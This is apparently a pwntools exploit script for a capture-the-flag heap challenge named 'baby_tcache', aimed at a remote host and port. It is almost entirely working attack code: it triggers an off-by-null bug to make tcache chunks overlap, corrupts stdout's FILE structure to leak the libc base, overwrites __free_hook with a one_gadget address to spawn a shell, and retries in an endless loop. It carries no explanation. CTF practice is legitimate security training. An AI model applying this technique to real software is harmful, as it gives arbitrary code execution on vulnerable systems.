from pwn import *
binary='./baby_tcache'
elf=ELF(binary)
#
context.log_level=  "DEBUG"
#struct="""
#"""

#f=open('peda-structs','w')
#f.write(struct)
#f.close()


ru=lambda x:r.recvuntil(x)
rv=lambda x:r.recv(x)
rl=lambda :r.recvline()
sn=lambda x:r.send(x)
sl=lambda x:r.sendline(x)
io=lambda :r.interactive()
sla=lambda x,y:r.sendlineafter(x,y)
sa=lambda x,y:r.sendafter(x,y)

context.clear(arch='amd64')
#context.clear(arch='i386')

def newheap(sz,data):
	sla("choice:","1")
	sla("Size:",str(sz))
	sa("Data:",data)

def delheap(idx):
	sla("choice:","2")
	sla("Index:",str(idx))

def main(C):
	global r
	if C=="1":
		r=process(binary,env={"LD_PRELOAD":""})
		libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elif C=="2":
		r=process(binary,env={"LD_PRELOAD":"./libc.so.6"})
		libc=ELF('./libc.so.6')
	else:
		r=remote("52.68.236.186", 56746)
		libc=ELF('./libc.so.6')
	newheap(0x1ff0,"A")
	newheap(0xff0,"A")
        gdb.attach(r)
	delheap(0)
	newheap(0x108,"xx") #trigger off by null
	
	for i in xrange(8):
		newheap(0x100,"B")
	for i in xrange(3,10):
		delheap(i)
	delheap(2)
	delheap(0)
	for i in xrange(8):
		newheap(0x100,"\x10")
	
	delheap(0)
	newheap(0x200,"C")
	newheap(0x200,"C")
	delheap(1)  #overlap
	

	for i in xrange(1,8):
		delheap(i)
	delheap(9) #0x200
	delheap(0) #0x200
	newheap(0x1150,"c") #0
	
	newheap(0xd0,"D")
	newheap(0x20,"C")
	newheap(0x550,"a") #3
	newheap(0x30,"a")
	delheap(3)
	newheap(0x40,"\x60\xd7")
	
	newheap(0x100,"a") #6
	newheap(0x100,p64(0xfbad3c80)+p64(0)*3+"\x08")
	libc.address=u64(rv(8))-0x3ed8b0
	log.info("libc : " + hex(libc.address))
	newheap(0x600,"A"*0x1d0+p64(libc.symbols['__free_hook']))
	delheap(8)
	delheap(1)
	newheap(0x200,"A")
	newheap(0x200,p64(libc.address+0x4f322))
	delheap(0)

	io()

#main(sys.argv[1])

if __name__=="__main__":
	while 1:
		try:
			main(sys.argv[1])
		except:
			pass
